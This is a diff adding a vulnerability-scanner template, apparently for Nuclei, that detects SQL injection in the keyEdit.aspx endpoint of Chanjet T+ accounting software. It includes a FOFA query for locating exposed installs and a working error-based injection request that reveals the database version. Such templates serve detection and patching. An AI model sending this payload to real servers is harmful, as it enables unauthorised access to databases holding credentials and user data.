@@ -1,0 +1,36 @@
+id: changjietong-keyEdit-sql
+
+info:
+  name: "畅捷通 T+ keyEdit.aspx 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="畅捷通-TPlus"
+    该漏洞源于对用户输入的过滤和校验机制缺失，攻击者可利用此漏洞在未授权情况下执行SQL注入攻击，进而获取数据库中的敏感信息（如管理员凭证及用户数据）。在具备高权限条件下，攻击者可能通过注入 payload 向服务器写入恶意文件，最终实现对服务器系统的控制。参考链接：
+    - https://example.com/reference1
+    - https://example.com/reference2
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/139899808
+  tags: 畅捷通T+
+
+http:
+- raw:
+  - |
+    GET /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&preload=1 HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '转换成数据类型 int 时失败'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
+
